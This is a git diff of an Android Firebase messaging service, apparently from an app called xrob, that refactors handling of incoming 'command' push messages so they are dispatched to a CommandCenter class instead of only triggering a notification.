@@ -8,8 +8,14 @@ import android.util.Log;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 import com.theah64.xrob.R;
+import com.theah64.xrob.commandcenter.CommandCenter;
+import com.theah64.xrob.commandcenter.CommandFactory;
+import com.theah64.xrob.commandcenter.commands.BaseCommand;
+import com.theah64.xrob.commandcenter.commands.NotificationCommand;
 import com.theah64.xrob.database.Commands;
+import com.theah64.xrob.models.Command;
 
+import org.acra.ACRA;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -21,9 +27,11 @@ public class MessagingService extends FirebaseMessagingService {
     private static final String KEY_TYPE = "type";
     private static final String TYPE_COMMAND = "command";
     private static final String KEY_DATA = "data";
+    private static final String KEY_TYPE_DATA = "type_data";
 
     @Override
     public void onMessageReceived(RemoteMessage remoteMessage) {
+
         Map<String, String> payload = remoteMessage.getData();
         Log.i(X, "FCM says : " + payload);
         if (!payload.isEmpty()) {
@@ -31,20 +39,8 @@ public class MessagingService extends FirebaseMessagingService {
             final String type = payload.get(KEY_TYPE);
 
             if (type.equals(TYPE_COMMAND)) {
-
-                Log.d(X, "Command received");
-
-                try {
-                    final JSONObject joCommand = new JSONObject(payload.get(KEY_DATA));
-
-                    final String id = joCommand.getString(Commands.COLUMN_ID);
-                    final String command = joCommand.getString(Commands.COLUMN_COMMAND);
-
-                    showNotification(this, command);
-
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
+                Log.d(X, "Command is gonna handle...");
+                CommandCenter.handle(this, payload.get(KEY_TYPE_DATA));
             }
         }
     }
